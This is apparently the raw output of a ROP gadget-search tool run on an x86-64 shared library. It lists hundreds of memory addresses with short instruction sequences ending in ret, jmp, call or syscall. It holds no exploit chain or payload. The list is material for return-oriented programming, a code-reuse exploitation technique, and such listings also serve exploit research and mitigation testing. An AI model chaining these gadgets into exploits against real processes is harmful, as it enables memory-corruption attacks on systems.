0x00002aaaaac1790a : add bl, al ; nop dword ptr [rax] ; xor eax, eax ; ret
0x00002aaaaab5da2c : add bl, al ; ret
0x00002aaaaac0955e : add bl, al ; xor eax, eax ; ret
0x00002aaaaac5e917 : add bl, bh ; inc ebx ; add dh, bh ; jmp rdi
0x00002aaaaac69211 : add bl, bh ; jmp rax
0x00002aaaaac7e207 : add bl, byte ptr [rax + 0x41180e0a] ; ret
0x00002aaaaac71f9d : add bl, byte ptr [rax + 0xa] ; ret
0x00002aaaaac86c55 : add bl, byte ptr [rbp + 0xa] ; ret
0x00002aaaaab485aa : add bl, byte ptr [rbx + 0x5d] ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaac76a37 : add bl, byte ptr [rcx + 0xa] ; ret
0x00002aaaaac89d58 : add bl, byte ptr [rdi + 0x41280e0a] ; ret
0x00002aaaaac7e2c5 : add bl, byte ptr [rdx + 0xa] ; ret
0x00002aaaaac91167 : add bl, ch ; add eax, 0x690000 ; add byte ptr [rax], al ; ret
0x00002aaaaab505dd : add bl, ch ; fucomp st(0) ; ret
0x00002aaaaabfae84 : add bl, ch ; leave ; mov eax, 0x200000 ; jmp 0x125e59
0x00002aaaaab9363a : add bl, ch ; ret 0x1f0f
0x00002aaaaabfae8b : add bl, ch ; ret 0xb8
0x00002aaaaab7b22f : add bl, dh ; movq qword ptr [rdi - 1], mm0 ; ret
0x00002aaaaab7b23f : add bl, dh ; movq qword ptr [rdi], mm0 ; ret
0x00002aaaaab09cdd : add bl, dh ; mulps xmm1, xmm0 ; movaps xmm0, xmm1 ; ret
0x00002aaaaaaf5582 : add bl, dh ; ret
0x00002aaaaab080be : add bl, sil ; ret
0x00002aaaaac7e44b : add byte ptr [0xffffffffe8b00000], dl ; int1 ; call qword ptr [rbx]
0x00002aaaaab5c2c3 : add byte ptr [r11 + 0x5d], r11b ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaaba1fc7 : add byte ptr [r15 - 0x48], sil ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x00002aaaaab26fe7 : add byte ptr [r8 - 0x7d], r9b ; call 0xffffffffc23e67f9
0x00002aaaaaaf8de5 : add byte ptr [r8 - 0x7d], r9b ; ret 0x4901
0x00002aaaaac74b0d : add byte ptr [r8], al ; adc byte ptr [rbx], dh ; jmp 0x19fb19
0x00002aaaaac74abd : add byte ptr [r8], al ; xor bpl, bl ; call qword ptr [rcx]
0x00002aaaaab0be8d : add byte ptr [r8], r8b ; add rsp, 8 ; ret
0x00002aaaaac74e5d : add byte ptr [r8], r8b ; nop ; pop rsp ; jmp 0x19fe69
0x00002aaaaac74f15 : add byte ptr [r8], r8b ; pop rdi ; jmp 0x19ff21
0x00002aaaaab101dc : add byte ptr [r9], r14b ; ror byte ptr [rax - 0x7d], 0xc4 ; or byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaac7f0df : add byte ptr [rax + 0x15], dh ; jmp qword ptr [rcx]
0x00002aaaaab5bbef : add byte ptr [rax + 0x16], bh ; ret
0x00002aaaaac8f2b7 : add byte ptr [rax + 0x16], bl ; clc ; jmp qword ptr [rcx]
0x00002aaaaac90b1c : add byte ptr [rax + 0x1809], dh ; loopne 0x1bbb36 ; ret 0xa
0x00002aaaaac90ac4 : add byte ptr [rax + 0x180a], dh ; loopne 0x1bbadf ; ret 0xb
0x00002aaaaac7afb7 : add byte ptr [rax + 0x1a], bh ; cli ; call qword ptr [rax]
0x00002aaaaac83c67 : add byte ptr [rax + 0x1c], cl ; cmc ; call qword ptr [rdx]
0x00002aaaaac83d2f : add byte ptr [rax + 0x1e], dl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac83def : add byte ptr [rax + 0x1f], al ; cmc ; jmp qword ptr [rcx]
0x00002aaaaab09bab : add byte ptr [rax + 0x1fe8c17f], al ; ret
0x00002aaaaab593fe : add byte ptr [rax + 0x24748b48], dl ; sub byte ptr [rax - 0x77], cl ; out dx, eax ; call rax
0x00002aaaaac7f547 : add byte ptr [rax + 0x24], cl ; jmp qword ptr [rcx]
0x00002aaaaac7d807 : add byte ptr [rax + 0x25], bh ; int1 ; call qword ptr [rcx]
0x00002aaaaac7d787 : add byte ptr [rax + 0x25], bh ; int1 ; jmp qword ptr [rcx]
0x00002aaaaac46e8f : add byte ptr [rax + 0x27201fa], al ; mov byte ptr [rdi], cl ; ret
0x00002aaaaab07857 : add byte ptr [rax + 0x29], cl ; ret
0x00002aaaaabb7e52 : add byte ptr [rax + 0x29], cl ; ret 0x148
0x00002aaaaab95954 : add byte ptr [rax + 0x29], cl ; ret 0x2948
0x00002aaaaaafe44a : add byte ptr [rax + 0x29], cl ; ret 0x349
0x00002aaaaab53dc5 : add byte ptr [rax + 0x29], cl ; ret 0x8d48
0x00002aaaaaafd552 : add byte ptr [rax + 0x29], cl ; ret 0xe183
0x00002aaaaac7f687 : add byte ptr [rax + 0x2c], cl ; jmp rcx
0x00002aaaaac7d8ff : add byte ptr [rax + 0x30], ah ; int1 ; jmp qword ptr [rcx]
0x00002aaaaac03d5e : add byte ptr [rax + 0x31], cl ; enter -0x3eb8, -0x1f ; or byte ptr [rax - 0x77], cl ; ret 0x314c
0x00002aaaaac0418d : add byte ptr [rax + 0x31], cl ; ror dword ptr [rbp + 0x39], 1 ; ret 0x850f
0x00002aaaaac74abf : add byte ptr [rax + 0x32], al ; jmp 0x19fac7
0x00002aaaaac7a787 : add byte ptr [rax + 0x37], cl ; out dx, al ; jmp qword ptr [rdx]
0x00002aaaaab1ab6c : add byte ptr [rax + 0x39], cl ; ret
0x00002aaaaabc58bc : add byte ptr [rax + 0x39], cl ; ret 0x3c76
0x00002aaaaab529d6 : add byte ptr [rax + 0x39], cl ; ret 0x840f
0x00002aaaaab920d3 : add byte ptr [rax + 0x39], cl ; ret 0x850f
0x00002aaaaab00dbe : add byte ptr [rax + 0x39], cl ; ret 0x860f
0x00002aaaaab52997 : add byte ptr [rax + 0x39], cl ; ret 0x8948
0x00002aaaaabe96f1 : add byte ptr [rax + 0x39], cl ; ret 0xd975
0x00002aaaaabe97b0 : add byte ptr [rax + 0x39], cl ; ret 0xda75
0x00002aaaaab5cb8b : add byte ptr [rax + 0x39], cl ; sal byte ptr [rbp - 0x51], 1 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaac0c6ef : add byte ptr [rax + 0x39], cl ; sal byte ptr [rbx + rcx + 0x48], 1 ; add esp, 8 ; ret
0x00002aaaaac7af27 : add byte ptr [rax + 0x3e], ch ; cli ; call qword ptr [rax]
0x00002aaaaac68ab5 : add byte ptr [rax + 0x43], dl ; pop rcx ; clc ; ret 0x6e1f
0x00002aaaaac73def : add byte ptr [rax + 0x44], al ; cli ; jmp qword ptr [rcx]
0x00002aaaaab4af86 : add byte ptr [rax + 0x4740000], al ; mov eax, edx ; pop rbx ; ret
0x00002aaaaac8f98f : add byte ptr [rax + 0x47], ah ; clc ; call qword ptr [rbx]
0x00002aaaaac84507 : add byte ptr [rax + 0x4b], bl ; cmc ; jmp rax
0x00002aaaaac8fd27 : add byte ptr [rax + 0x54], cl ; clc ; jmp qword ptr [rcx]
0x00002aaaaac71dd7 : add byte ptr [rax + 0x56], bh ; jmp 0x1b90e3
0x00002aaaaab45675 : add byte ptr [rax + 0x5740000], al ; mov eax, esi ; pop rbx ; ret
0x00002aaaaac781f7 : add byte ptr [rax + 0x59], ch ; in eax, dx ; call qword ptr [rax]
0x00002aaaaaaf492d : add byte ptr [rax + 0x5b], bl ; pop rbp ; ret
0x00002aaaaac84a07 : add byte ptr [rax + 0x5b], ch ; cmc ; jmp qword ptr [rcx]
0x00002aaaaab430d7 : add byte ptr [rax + 0x5b], dh ; mov eax, edx ; pop rbp ; pop r12 ; ret
0x00002aaaaac849ef : add byte ptr [rax + 0x5b], dl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaabdb828 : add byte ptr [rax + 0x5f], bl ; call rax
0x00002aaaaac74f17 : add byte ptr [rax + 0x5f], cl ; jmp 0x19ff1f
0x00002aaaaab03c94 : add byte ptr [rax + 0x63], cl ; adc al, 0x88 ; add rax, rdx ; jmp rax
0x00002aaaaab30f51 : add byte ptr [rax + 0x63], cl ; adc al, 0x90 ; add rax, rdx ; jmp rax
0x00002aaaaab38e44 : add byte ptr [rax + 0x63], cl ; adc al, 0x91 ; add rcx, rdx ; jmp rcx
0x00002aaaaab59737 : add byte ptr [rax + 0x63], cl ; adc al, 0x98 ; add rax, rdx ; jmp rax
0x00002aaaaab38883 : add byte ptr [rax + 0x63], cl ; add al, 0x81 ; add rcx, rax ; jmp rcx
0x00002aaaaab40c83 : add byte ptr [rax + 0x63], cl ; add al, 0x82 ; add rdx, rax ; jmp rdx
0x00002aaaaab4194b : add byte ptr [rax + 0x63], cl ; add al, 0x86 ; add rax, rsi ; jmp rax
0x00002aaaaab038ec : add byte ptr [rax + 0x63], cl ; add al, 0x8e ; add rsi, rax ; jmp rsi
0x00002aaaaab20601 : add byte ptr [rax + 0x63], cl ; add al, 0x90 ; add rax, rdi ; jmp rax
0x00002aaaaab7f016 : add byte ptr [rax + 0x63], cl ; add al, 0xbe ; add rsi, rax ; jmp rsi
0x00002aaaaab0fb49 : add byte ptr [rax + 0x63], cl ; and al, 0xc ; add rsp, 0x18 ; ret
0x00002aaaaabc727b : add byte ptr [rax + 0x63], cl ; or al, 0x8a ; add rdx, rcx ; jmp rdx
0x00002aaaaab08296 : add byte ptr [rax + 0x63], cl ; or al, 0x8f ; add rcx, rdi ; jmp rcx
0x00002aaaaab202da : add byte ptr [rax + 0x63], cl ; ret
0x00002aaaaab40d6a : add byte ptr [rax + 0x63], cl ; ret 0x3948
0x00002aaaaabe7485 : add byte ptr [rax + 0x63], cl ; ret 0x4864
0x00002aaaaab8727f : add byte ptr [rax + 0x63], cl ; ret 0x8348
0x00002aaaaab47d2f : add byte ptr [rax + 0x63], cl ; ret 0x8d4c
0x00002aaaaabf81ff : add byte ptr [rax + 0x63], cl ; rol byte ptr [rcx + rcx*4 - 0x40], cl ; mov byte ptr [rdi + rdx], 0 ; ret
0x00002aaaaabf8380 : add byte ptr [rax + 0x63], cl ; ror byte ptr [rax + 1], 1 ; xlatb ; mov qword ptr [r9], rdi ; ret
0x00002aaaaab1b17d : add byte ptr [rax + 0x63], cl ; ror byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaab2064c : add byte ptr [rax + 0x63], cl ; ror dword ptr [rax - 0x7d], cl ; ret 0x4820
0x00002aaaaab41a9c : add byte ptr [rax + 0x63], cl ; xor al, 0xb7 ; add rdi, rsi ; jmp rdi
0x00002aaaaac7de47 : add byte ptr [rax + 0x64], cl ; int1 ; call qword ptr [rdx]
0x00002aaaaabca34e : add byte ptr [rax + 0x6607b70f], dl ; mov dword ptr [rsi], eax ; xor eax, eax ; ret
0x00002aaaaaba168f : add byte ptr [rax + 0x66], bh ; syscall ; ret
0x00002aaaaab09874 : add byte ptr [rax + 0x66d02148], al ; movd mm0, rax ; ret
0x00002aaaaaba16af : add byte ptr [rax + 0x68], bh ; syscall ; ret
0x00002aaaaab91d1e : add byte ptr [rax + 0x69], cl ; rol byte ptr [rax + 0x49000151], 1 ; ret
0x00002aaaaaba169f : add byte ptr [rax + 0x6b], bh ; syscall ; ret
0x00002aaaaaba16bf : add byte ptr [rax + 0x6c], bh ; syscall ; ret
0x00002aaaaaba167f : add byte ptr [rax + 0x6e], bh ; syscall ; ret
0x00002aaaaac84d67 : add byte ptr [rax + 0x6e], ch ; cmc ; jmp qword ptr [rcx]
0x00002aaaaaba167e : add byte ptr [rax + 0x6e], dil ; syscall ; ret
0x00002aaaaac84d4f : add byte ptr [rax + 0x6e], dl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac90463 : add byte ptr [rax + 0x6f980002], ch ; clc ; call rcx
0x00002aaaaaba18cf : add byte ptr [rax + 0x6f], bh ; syscall ; ret
0x00002aaaaac713c7 : add byte ptr [rax + 0x6f], ch ; std ; call qword ptr [rcx]
0x00002aaaaac84f2f : add byte ptr [rax + 0x70], al ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac85007 : add byte ptr [rax + 0x71], cl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac850c7 : add byte ptr [rax + 0x72], ch ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac850af : add byte ptr [rax + 0x72], dl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac85187 : add byte ptr [rax + 0x73], bh ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac7b98f : add byte ptr [rax + 0x73], dh ; out dx, eax ; call rax
0x00002aaaaab5deaf : add byte ptr [rax + 0x74c08402], cl ; adc cl, byte ptr [rax - 1] ; ret 0x2288
0x00002aaaaac8531f : add byte ptr [rax + 0x76], ah ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac85337 : add byte ptr [rax + 0x76], bh ; cmc ; jmp qword ptr [rcx]
0x00002aaaaab46323 : add byte ptr [rax + 0x7740000], al ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab454f3 : add byte ptr [rax + 0x7740000], al ; mov eax, esi ; pop rbx ; ret
0x00002aaaaac853e7 : add byte ptr [rax + 0x78], bl ; cmc ; jmp qword ptr [rbx]
0x00002aaaaab7b77f : add byte ptr [rax + 0x78d4837], cl ; ret
0x00002aaaaac8560f : add byte ptr [rax + 0x7b], ah ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac85627 : add byte ptr [rax + 0x7b], bh ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac855f7 : add byte ptr [rax + 0x7b], cl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac705ff : add byte ptr [rax + 0x7b], dl ; std ; jmp qword ptr [rdx]
0x00002aaaaac789a7 : add byte ptr [rax + 0x7d], ch ; in eax, dx ; call qword ptr [rsi]
0x00002aaaaaba1e57 : add byte ptr [rax + 0x7e], bh ; ret
0x00002aaaaac7ac2f : add byte ptr [rax + 0x7e], dl ; out dx, al ; jmp qword ptr [rcx]
0x00002aaaaaba1daa : add byte ptr [rax + 0x7f], bh ; ret
0x00002aaaaab4282a : add byte ptr [rax + 0x8740000], al ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4b0aa : add byte ptr [rax + 0x8740000], al ; mov eax, esi ; pop rbx ; ret
0x00002aaaaab4ab81 : add byte ptr [rax + 0x9740000], al ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab45fe9 : add byte ptr [rax + 0x9740000], al ; mov eax, r8d ; pop rbx ; ret
0x00002aaaaab44dbf : add byte ptr [rax + 0xb740000], al ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab907bf : add byte ptr [rax + 0xc9], bh ; syscall ; ret
0x00002aaaaabe94d1 : add byte ptr [rax + 0xca], bh ; syscall ; pop rdx ; pop rsi ; ret
0x00002aaaaac8144f : add byte ptr [rax + 0xd], dl ; hlt ; jmp rcx
0x00002aaaaabdbbff : add byte ptr [rax + 0xe4], bh ; syscall ; ret
0x00002aaaaab4618c : add byte ptr [rax + 0xe740000], al ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4b1ec : add byte ptr [rax + 0xe740000], al ; mov eax, esi ; pop rbx ; ret
0x00002aaaaab02dd4 : add byte ptr [rax + 0xf], al ; mov bh, 0xc0 ; ret
0x00002aaaaab618a5 : add byte ptr [rax + 0xf], cl ; mov ebp, 0xf80148c0 ; ret
0x00002aaaaab9d9ec : add byte ptr [rax + 0xf], cl ; ret
0x00002aaaaab4dcdb : add byte ptr [rax + 0xf], cl ; ret 0x294d
0x00002aaaaab62a9b : add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x00002aaaaac14c64 : add byte ptr [rax + 0xf], cl ; ret 0x8348
0x00002aaaaabe341b : add byte ptr [rax + 0xf], cl ; ret 0x8349
0x00002aaaaab267bb : add byte ptr [rax + 0xf], cl ; ret 0x8948
0x00002aaaaabcdb16 : add byte ptr [rax + 0xf], cl ; ret 0x8b48
0x00002aaaaab924b6 : add byte ptr [rax + 0xf], cl ; ret 0x8d48
0x00002aaaaab635eb : add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x00002aaaaabcda8c : add byte ptr [rax + 0xf], cl ; ret 0xc3f6
0x00002aaaaaafab98 : add byte ptr [rax + 0xf], cl ; ret 0xc985
0x00002aaaaaafa397 : add byte ptr [rax + 0xf], cl ; ret 0xdb85
0x00002aaaaaafd094 : add byte ptr [rax + 0xf], cl ; ret 0xed85
0x00002aaaaaba03cd : add byte ptr [rax + 0xf], cl ; ret 0xfc3
0x00002aaaaabfaadc : add byte ptr [rax + 0xf], cl ; ret 0xff81
0x00002aaaaaba1e6f : add byte ptr [rax + 0xfc17], bh ; ret
0x00002aaaaac81f9b : add byte ptr [rax + 1], ah ; add byte ptr [rax - 0x6d], ah ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac81fb3 : add byte ptr [rax + 1], bh ; add byte ptr [rax - 0x6d], bh ; hlt ; jmp qword ptr [rcx]
0x00002aaaaabd3bd4 : add byte ptr [rax + 1], bh ; add rsp, 8 ; ret
0x00002aaaaac46d3f : add byte ptr [rax + 1], bh ; jg 0x171d5a ; neg eax ; ret
0x00002aaaaab800af : add byte ptr [rax + 1], bh ; jg 0xab0c3 ; neg eax ; ret
0x00002aaaaac0c0fa : add byte ptr [rax + 1], bh ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabff45f : add byte ptr [rax + 1], bh ; pop rbx ; ret
0x00002aaaaab1f0b5 : add byte ptr [rax + 1], bh ; ret
0x00002aaaaab62d45 : add byte ptr [rax + 1], cl ; clc ; add rax, rcx ; ret
0x00002aaaaab94502 : add byte ptr [rax + 1], cl ; clc ; jmp rax
0x00002aaaaab11036 : add byte ptr [rax + 1], cl ; ret
0x00002aaaaab10f0f : add byte ptr [rax + 1], cl ; ret 0x1a75
0x00002aaaaab8fa4c : add byte ptr [rax + 1], cl ; ret 0x8d48
0x00002aaaaab1e510 : add byte ptr [rax + 1], cl ; ror byte ptr [rax + 0x39], 1 ; ret 0x8949
0x00002aaaaab4c3ee : add byte ptr [rax + 1], dil ; ret
0x00002aaaaac0249f : add byte ptr [rax + 2], bh ; ret
0x00002aaaaaba2046 : add byte ptr [rax + 7], bh ; ret
0x00002aaaaabc0dd2 : add byte ptr [rax + 9], cl ; ret 0x8949
0x00002aaaaabbff38 : add byte ptr [rax + 9], cl ; ret 0x8b48
0x00002aaaaac507cb : add byte ptr [rax + rax + 0xbf0000], bh ; add byte ptr [rax], al ; ret 0
0x00002aaaaac7d4e3 : add byte ptr [rax + rax*4], dh ; add byte ptr [rax], al ; or byte ptr [rcx + rsi*8], bl ; jmp qword ptr [rcx]
0x00002aaaaac7bfa3 : add byte ptr [rax + rax*8], ch ; add byte ptr [rax], ch ; mov ch, 0xfb ; call qword ptr [rax]
0x00002aaaaab7adfc : add byte ptr [rax + rax], 0 ; ret
0x00002aaaaac1111b : add byte ptr [rax + rax], al ; add al, ch ; in al, dx ; xor al, 0 ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaabc5712 : add byte ptr [rax + rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaaae031f : add byte ptr [rax + rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x4f
0x00002aaaaab0f268 : add byte ptr [rax + rax], al ; add byte ptr [rax], al ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab3f96e : add byte ptr [rax + rax], al ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x00002aaaaabea6fe : add byte ptr [rax + rax], al ; cmove rax, rdx ; ret
0x00002aaaaab4ccb9 : add byte ptr [rax + rax], bl ; add byte ptr [rax], al ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac72fe7 : add byte ptr [rax + rax], ch ; add byte ptr [rax], al ; mov ah, 0x30 ; add byte ptr [rax], al ; ret 0xffe9
0x00002aaaaabd1279 : add byte ptr [rax + rax], cl ; add byte ptr [rax], al ; mov eax, 0xffffffff ; ret
0x00002aaaaab56b3b : add byte ptr [rax + rax], cl ; add byte ptr [rax], al ; mov rax, rcx ; ret
0x00002aaaaab5dc67 : add byte ptr [rax + rax], cl ; add byte ptr [rax], al ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab57339 : add byte ptr [rax + rax], cl ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaaae27af : add byte ptr [rax + rax], dh ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x31
0x00002aaaaac730af : add byte ptr [rax + rax], dl ; add byte ptr [rax], al ; jl 0x19e0f1 ; add byte ptr [rax], al ; clc ; ret
0x00002aaaaac7c17f : add byte ptr [rax + rax], dl ; add byte ptr [rax], al ; ret 0
0x00002aaaaac7c1c7 : add byte ptr [rax + rax], dl ; add byte ptr [rax], al ; xchg eax, esp ; ret 0
0x00002aaaaab809b5 : add byte ptr [rax + rbp*2 + 0x48], dh ; lea eax, dword ptr [rdi - 0x10] ; ret
0x00002aaaaac7a783 : add byte ptr [rax + rbp*4], cl ; add byte ptr [rax + 0x37], cl ; out dx, al ; jmp qword ptr [rdx]
0x00002aaaaac6ba67 : add byte ptr [rax + rbp*4], dl ; in eax, dx ; call rsp
0x00002aaaaac857ab : add byte ptr [rax + rbx*2 + 1], dh ; add byte ptr [rax - 0x7b], dh ; cmc ; jmp rax
0x00002aaaaac75763 : add byte ptr [rax + rbx*2], ch ; add byte ptr [rax], al ; sbb dl, cl ; in al, dx ; jmp rax
0x00002aaaaac7d783 : add byte ptr [rax + rbx*8], cl ; add byte ptr [rax + 0x25], bh ; int1 ; jmp qword ptr [rcx]
0x00002aaaaac6bc3f : add byte ptr [rax + rbx*8], dl ; in eax, dx ; jmp rsp
0x00002aaaaab6379c : add byte ptr [rax + rcx + 0x48], dh ; lea eax, dword ptr [rip + 0x10e4a] ; ret
0x00002aaaaab6885c : add byte ptr [rax + rcx + 0x48], dh ; lea eax, dword ptr [rip + 0xb63a] ; ret
0x00002aaaaab80cc4 : add byte ptr [rax + rcx + 0x48], dh ; lea eax, dword ptr [rip + 0xc31b2] ; ret
0x00002aaaaab63024 : add byte ptr [rax + rcx + 0x48], dh ; lea eax, dword ptr [rip + 0xdf812] ; ret
0x00002aaaaabea72c : add byte ptr [rax + rcx + 0x48], dh ; lea eax, dword ptr [rip - 0x76156] ; ret
0x00002aaaaabea63c : add byte ptr [rax + rcx + 0x48], dh ; lea eax, dword ptr [rip - 0x767b6] ; ret
0x00002aaaaab45a75 : add byte ptr [rax + rcx + 0x5b], dh ; mov eax, edx ; pop rbp ; pop r12 ; ret
0x00002aaaaabd422d : add byte ptr [rax + rcx - 9], dh ; ret 0xfc07
0x00002aaaaaaf5be6 : add byte ptr [rax + rcx*2 + 3], ah ; add al, 0x25 ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaab1ace6 : add byte ptr [rax + rcx*2 - 0x75], ah ; add byte ptr [rax - 0x77], cl ; ret 0xde8
0x00002aaaaab028fb : add byte ptr [rax + rcx*2 - 0x77], ah ; xor dword ptr [rax + 0x39], ecx ; ror byte ptr [rax - 0x39], 1 ; ret 0xffff
0x00002aaaaac6d187 : add byte ptr [rax + rcx], al ; hlt ; call rsp
0x00002aaaaac9076b : add byte ptr [rax + rcx], dh ; add al, byte ptr [rax] ; add byte ptr [rdx - 8], bh ; call qword ptr [rcx]
0x00002aaaaac7074b : add byte ptr [rax + rcx], dl ; add byte ptr [rax], al ; test bpl, al ; jmp qword ptr [rcx]
0x00002aaaaac837a3 : add byte ptr [rax + rdi + 1], ch ; add al, bl ; std ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac837bb : add byte ptr [rax + rdi - 0x20fffff], al ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac6c1f7 : add byte ptr [rax + rdi*2], al ; out dx, al ; call rsp
0x00002aaaaac7b7cb : add byte ptr [rax + rdi*4 + 0x1e00000], dl ; out dx, eax ; jmp rsi
0x00002aaaaac51977 : add byte ptr [rax + rdx + 0x10bf0000], bh ; add byte ptr [rax], al ; ret 0x10
0x00002aaaaac80fd3 : add byte ptr [rax + rdx - 0x4307ffff], bl ; jmp qword ptr [rdi]
0x00002aaaaab4aad5 : add byte ptr [rax + rdx - 0x75], dh ; jo 0x75a6c ; sar byte ptr [rax + 9], 0xf3 ; ret
0x00002aaaaac6b6f7 : add byte ptr [rax + rdx*2], ah ; jmp 0x1966ff
0x00002aaaaac84f73 : add byte ptr [rax + rdx*2], bh ; add dword ptr [rax], eax ; mov byte ptr [rax - 0xb], dh ; jmp qword ptr [rcx]
0x00002aaaaac74f93 : add byte ptr [rax + rdx*2], bl ; add byte ptr [rax - 0x4a], bl ; jmp 0x19ffa3
0x00002aaaaac6ccc7 : add byte ptr [rax + rdx*4], al ; jmp rsp
0x00002aaaaac82feb : add byte ptr [rax + rsi - 0x1cbfffff], dh ; hlt ; call qword ptr [rsi]
0x00002aaaaac86fb3 : add byte ptr [rax + rsi*2 + 1], bh ; add al, bh ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaac86f83 : add byte ptr [rax + rsi*2 + 1], cl ; add al, bh ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaac86f53 : add byte ptr [rax + rsi*2], bl ; add dword ptr [rax], eax ; clc ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaac7afe3 : add byte ptr [rax + rsi*4 + 0x54180000], ch ; cli ; call qword ptr [rax]
0x00002aaaaac7afb3 : add byte ptr [rax + rsi*4], bh ; add byte ptr [rax + 0x1a], bh ; cli ; call qword ptr [rax]
0x00002aaaaac7efdb : add byte ptr [rax + rsi*8 + 0x13a00000], ah ; jmp qword ptr [rcx]
0x00002aaaaac833c7 : add byte ptr [rax - 0x14], ch ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac833af : add byte ptr [rax - 0x14], dl ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac83367 : add byte ptr [rax - 0x15], bl ; hlt ; jmp rdx
0x00002aaaaac07fdd : add byte ptr [rax - 0x168b7f80], 0x89 ; ret 0x48bf
0x00002aaaaac832ff : add byte ptr [rax - 0x17], ah ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac7e507 : add byte ptr [rax - 0x17], bl ; int1 ; jmp qword ptr [rdi]
0x00002aaaaab052f9 : add byte ptr [rax - 0x188b7f80], 0x89 ; ret 0x8948
0x00002aaaaabc5884 : add byte ptr [rax - 0x188b7f80], 0x89 ; ret 0x8b48
0x00002aaaaac801bf : add byte ptr [rax - 0x1b], al ; call qword ptr [rsi]
0x00002aaaaac82fef : add byte ptr [rax - 0x1d], al ; hlt ; call qword ptr [rsi]
0x00002aaaaac83007 : add byte ptr [rax - 0x1d], cl ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac82e2f : add byte ptr [rax - 0x21], al ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac82e47 : add byte ptr [rax - 0x21], bl ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac82e5f : add byte ptr [rax - 0x21], dh ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac7b107 : add byte ptr [rax - 0x23], ch ; out dx, al ; jmp qword ptr [rsi]
0x00002aaaaac7971f : add byte ptr [rax - 0x26], ah ; in eax, dx ; call qword ptr [rsi]
0x00002aaaaac81237 : add byte ptr [rax - 0x26], ch ; jmp qword ptr [rcx]
0x00002aaaaac8121f : add byte ptr [rax - 0x26], dl ; jmp qword ptr [rcx]
0x00002aaaaabf25bc : add byte ptr [rax - 0x2976178c], 0xc1 ; out dx, al ; adc bh, dh ; ret 0x8080
0x00002aaaaac75a37 : add byte ptr [rax - 0x2c], cl ; in al, dx ; call qword ptr [rax]
0x00002aaaaab0b081 : add byte ptr [rax - 0x2d], cl ; loopne 0x360d7 ; or dword ptr [rdi], eax ; xor eax, eax ; ret
0x00002aaaaac0bb83 : add byte ptr [rax - 0x2e76178c], 0xc1 ; jmp 0xffffffff80d662a9
0x00002aaaaac0be0a : add byte ptr [rax - 0x2e76178c], 0xc1 ; jmp 0xffffffff80d66530
0x00002aaaaac75887 : add byte ptr [rax - 0x30], bl ; in al, dx ; jmp rbx
0x00002aaaaab09c33 : add byte ptr [rax - 0x3791f09a], al ; movss dword ptr [rdi], xmm1 ; ret
0x00002aaaaab47c75 : add byte ptr [rax - 0x39], cl ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x00002aaaaab50b18 : add byte ptr [rax - 0x39], cl ; or byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x00002aaaaab50209 : add byte ptr [rax - 0x39], cl ; push r8 ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x00002aaaaab08dc7 : add byte ptr [rax - 0x39], cl ; ret
0x00002aaaaab5bace : add byte ptr [rax - 0x39], cl ; ret 0xffdf
0x00002aaaaab314f9 : add byte ptr [rax - 0x39], cl ; ret 0xfffe
0x00002aaaaab49177 : add byte ptr [rax - 0x39], cl ; ret 0xffff
0x00002aaaaab803df : add byte ptr [rax - 0x39], cl ; rol byte ptr [rbx], 0 ; add byte ptr [rax], al ; ret
0x00002aaaaab803bf : add byte ptr [rax - 0x39], cl ; rol byte ptr [rcx], 0 ; add byte ptr [rax], al ; ret
0x00002aaaaab8041f : add byte ptr [rax - 0x39], cl ; rol byte ptr [rdi], 0 ; add byte ptr [rax], al ; ret
0x00002aaaaab803cf : add byte ptr [rax - 0x39], cl ; rol byte ptr [rdx], 0 ; add byte ptr [rax], al ; ret
